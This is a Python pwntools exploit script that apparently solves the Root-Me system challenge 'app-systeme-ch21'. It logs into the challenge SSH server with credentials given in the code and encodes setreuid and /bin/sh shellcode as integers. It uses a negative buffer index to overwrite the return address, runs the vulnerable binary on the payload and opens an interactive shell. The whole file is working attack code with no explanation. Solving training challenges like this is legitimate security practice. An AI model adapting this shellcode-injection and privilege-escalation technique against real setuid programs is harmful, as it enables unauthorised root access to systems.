from pwn import *

local_bin = "./ch21"
remote_bin = "./ch21" #For ssh

offset_ret = -15 # START BUFFER + (-15 << 2)  = offset BASE_BUFF to RET in insert

ssh_shell = ssh('app-systeme-ch21', 'challenge03.root-me.org', password='app-systeme-ch21', port=2223)

#p = ssh_shell.process(remote_bin) # start the vuln binary
elf = ELF(local_bin)# Extract data from binary

# Find ROP gadgets
rop = ROP(elf)

# We will maybe leave this for the end.
payload = str(int(0x90909090)).encode() + b'\n' + str(int(0x80000000)).encode() +  b'\n'
sh = enhex( asm( shellcraft.setreuid() + shellcraft.sh() ) )

count = 1
for i in range(0, len(sh), 8):
    if count == 15:
        print(count)
        print(sh[i:i + 4])
        payload += str(int.from_bytes(p16(int(hex(int(str(sh[i:i+4]), 16)), 16)), "big")).encode()
        payload += b'\n'  +  str(count).encode() +  b'\n'
    else:
        payload += str(int.from_bytes(p32(int(hex(int(str(sh[i:i+8]), 16)), 16)), "big")).encode()
        payload += b'\n'  +  str(count).encode() +  b'\n'
    count += 1

payload += str(int(0x8048502)).encode() + b'\n-15\n'
pyt = b'open("/tmp/aa/a", "w").write(b"""' + payload + b'""").close()'

ssh_shell.process(['/bin/mkdir', '/tmp/aa'])
ssh_shell.process(['python', '-c', pyt]).recvall()
#cat = ssh_shell.process(['/bin/cat', '/tmp/aa/a']).recvall()
#print(cat)
p = ssh_shell.process([remote_bin, '/tmp/aa/a'])

##### Interact with the shell #####
p.interactive() #Interact with the conenction
